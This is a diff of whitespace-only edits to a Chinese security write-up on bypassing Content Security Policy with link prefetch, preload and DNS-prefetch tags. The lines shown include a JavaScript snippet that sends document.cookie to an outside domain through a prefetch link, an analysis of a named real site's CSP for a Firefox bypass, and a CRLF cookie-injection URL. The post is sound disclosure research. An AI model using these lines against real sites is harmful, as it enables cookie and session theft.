@@ -33,14 +33,14 @@ Content Security Policy 1.0 各浏览具体支持情况图[1]：
     style-src   定义 CSS 加载策略
     sandbox 值为 allow-forms，对资源启用 sandbox
     report-uri  值为 /report-uri，提交日志
-    
+
 Source List Reference[2]：
 
 ![](http://ww1.sinaimg.cn/large/c334041bgw1f96u5k1x2wj21bm10cds4.jpg)
 
 #### 0x02 规则示例
 
-注： 
+注：
 
  - 多个指令用分号进行分割；
  - 多个指令值使用英文空格分割；
@@ -52,9 +52,9 @@ Source List Reference[2]：
     Content-Security-Policy: "default-src 'self'; script-src 'self' test.n0tr00t.com"
     X-Content-Security-Policy: "default-src 'self'; script-src 'self' test.n0tr00t.com"
     X-WebKit-CSP: "default-src 'self'; script-src 'self' test.n0tr00t.com"
-    
+
 2.禁止 frame ，允许所有图像，Style Self，允许执行加载所有 n0tr00t.com 域下的 JS 资源：
-	
+
     Content-Security-Policy: "script-src *.n0tr00t.com; style-src 'self'; img-src *; frame-src 'none'"
     X-Content-Security-Policy: "script-src *.n0tr00t.com; style-src 'self'; img-src *; frame-src 'none'"
     X-WebKit-CSP: "script-src *.n0tr00t.com; style-src 'self'; img-src *; frame-src 'none'"
@@ -75,7 +75,7 @@ Source List Reference[2]：
     }
 
 4.允许执行内联 JS 代码，但不允许加载外部资源：
-	
+
     Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';
 
 另外我们也可以使用在线生成 CSP 规则的站点来辅助编写：[http://cspisawesome.com/](http://cspisawesome.com/)
@@ -93,14 +93,14 @@ HTML5 页面资源预加载/预读取(Link prefetch)功能是通过Link标记实
 Chrome, Firefox ：
 
     <link rel="prefetch" href="http://rm-rf.gg/test_prefetch.jpg">
-    
+
 Chrome 预渲染（不要滥用！对地址所有资源进行提前渲染，如未使用的话则会白白浪费渲染资源。）:
-    
+
     <link rel="prerender" href="http://rm-rf.gg">
 
 DNS 预解析 DNS-Prefetch ，浏览器空闲时提前将分析页面需要资源所在的域名转化为 IP 地址，当浏览器真正使用到该域中的某个资源时就可以尽快地完成 DNS 解析。（例如在地址栏中输入 URL 时，Chrome 就已经自动完成了预解析甚至渲染，从而为每个请求节省了大量的时间。）：
 
-    <link rel="dns-prefetch" href="http://rm-rf.gg"> 
+    <link rel="dns-prefetch" href="http://rm-rf.gg">
 
 预连接 Preconnect （支持 Chrome46+, Firefox39+），与 DNS 预解析类似，preconnect 不仅完成 DNS 预解析，同时还将进行 TCP 握手和建立传输层协议：
 
@@ -145,7 +145,7 @@ Preload 作为一个新的 WEB 标准，它为处理当前页面而生，和 sub
     n0t.setAttribute("rel", "prefetch");
     n0t.setAttribute("href", "//n0tr00t.com/?" + document.cookie);
     document.head.appendChild(n0t);
-    
+
 页面渲染完毕会创建 Link REL=prefetch 的标签，发目标页面发起预加载，我们也可以使用其他属性（2016.02 Fuzz 部分结果）：
 
  - Prefetch
@@ -153,7 +153,7 @@ Preload 作为一个新的 WEB 标准，它为处理当前页面而生，和 sub
  - Preload
  - …
 
-E.g SourceCode : 
+E.g SourceCode :
 
     <?php
 
@@ -182,13 +182,13 @@ PageRequestResult :
 
 #### 0x05 Bypass Firefox CSP
 
-如果我们使用前面的 Prefetch 等标签在 Firefox 上是肯定传输不出去数据的，因为 Firefox 浏览器有着较高的  CSP 规范执行，所以我们可以使用其他属性来对 Firefox 上 CSP 进行绕过，虽然这些属性也已经申请加入规范，但目前仍可利用，下面来看目前 src.ly.com 的 CSP 规则： 
+如果我们使用前面的 Prefetch 等标签在 Firefox 上是肯定传输不出去数据的，因为 Firefox 浏览器有着较高的  CSP 规范执行，所以我们可以使用其他属性来对 Firefox 上 CSP 进行绕过，虽然这些属性也已经申请加入规范，但目前仍可利用，下面来看目前 src.ly.com 的 CSP 规则：
 
     content-security-policy:
     default-src *; script-src 'self' bi-collector.oneapm.com *.ly.com hm.baidu.com sec-pic-ly.b0.upaiyun.com  img1.40017.cn captcha.guard.qcloud.com  'unsafe-inline' 'unsafe-eval'; style-src 'self' *.ly.com sec-pic-ly.b0.upaiyun.com *.guard.qcloud.com 'unsafe-inline'; img-src 'self' sec-pic-ly.b0.upaiyun.com  hm.baidu.com  https://static.wooyun.org http://static.wooyun.org *.guard.qcloud.com  data: ; media-src 'self' *.ly.com *.40017.cn;font-src 'self' sec-pic-ly.b0.upaiyun.com data:
 
-1. script-src 'self' bi-collector.oneapm.com *.ly.com hm.baidu.com sec-pic-ly.b0.upaiyun.com  img1.40017.cn captcha.guard.qcloud.com  'unsafe-inline' 'unsafe-eval';  
-2. style-src 'self' *.ly.com sec-pic-ly.b0.upaiyun.com *.guard.qcloud.com 'unsafe-inline'; 
+1. script-src 'self' bi-collector.oneapm.com *.ly.com hm.baidu.com sec-pic-ly.b0.upaiyun.com  img1.40017.cn captcha.guard.qcloud.com  'unsafe-inline' 'unsafe-eval';
+2. style-src 'self' *.ly.com sec-pic-ly.b0.upaiyun.com *.guard.qcloud.com 'unsafe-inline';
 3. img-src 'self' sec-pic-ly.b0.upaiyun.com  hm.baidu.com  https://static.wooyun.org http://static.wooyun.org *.guard.qcloud.com  data: ;
 4. media-src 'self' *.ly.com *.40017.cn;
 5. font-src 'self' sec-pic-ly.b0.upaiyun.com data:;
@@ -222,7 +222,7 @@ Payload:
 还有一些伪绕过的 CASE，例如 CRLF （回车 + 换行 \r\n 的简称，在HTTP协议中，HTTP Header 与 HTTP Body 是用两个 CRLF 分隔的，浏览器就是根据这两个 CRLF 来取出 HTTP 内容并显示出来。），因为大部分浏览器是根据最后一次出现的同名头来设置的。
 
 E.g:
-	
+
 	http://www.n0tr00t.com/%0d%0aSet-cookie:ID%3Dabcdefg
 
 整篇文章写到并列出的一些 CASE 是我今年初（16） Fuzz 到的，前两天 Patrick Vananti 把 DNS 预解析的发出后，便想把之前的笔记进行简单整理并公布，其中还有一些未列出的属性和方法，欢迎研究：）
